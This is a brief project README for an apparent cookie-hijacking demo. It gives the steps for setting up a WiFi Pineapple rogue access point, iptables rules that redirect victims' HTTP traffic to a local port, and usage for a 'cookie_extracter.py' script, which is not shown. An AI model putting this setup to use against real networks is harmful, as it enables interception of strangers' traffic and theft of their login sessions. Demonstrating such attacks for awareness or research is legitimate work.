# oakland-demo



## Requirements
(preferably in a virtualenv) run:
```
pip install -r requirements.txt
```

on OSX:
```
  brew install --with-python libdnet
```

## Initialization on WiFi Pineapple

1. Turn on the WiFi Pineapple and wait for the blue light to go stable.
1. Connect to the `hijack_demo` access point.
1. In a browser go to `172.16.42.1:1471` and login.
1. Under the networking tab, enable `client AP` by scanning and connecting to a local WiFi for Internet access.
1. Now, ssh into the WiFi Pineaapple
2. Execute the following commands on startup to add iptable rules
3. 
    `iptables -t nat -D PREROUTING 1`

    `iptables -t nat -A PREROUTING -p tcp --dport 80 -i br-lan -j DNAT --to 172.16.42.1:8000`
1. Run the cookie hijacking script using the command below. Default interface for listening is `wlan0`


## Usage
```
  python cookie_extracter.py [-h] -i [listening interface] -a [IP address] -p [Port]
```
If you use WiFi Pineapple, use 172.16.42.1 and 8000 as IP address and port.

Otherwise, use the outgoing interface(ex. eth0), its IP address, and a port(ex. 3000)


## Example
Incoming on `wlan0`(10.42.0.1) and outgoing on `eth0`(192.168.1.10):
```
  python cookie_extracter.py -i eth0 -a 192.168.1.10 -p 3000
```
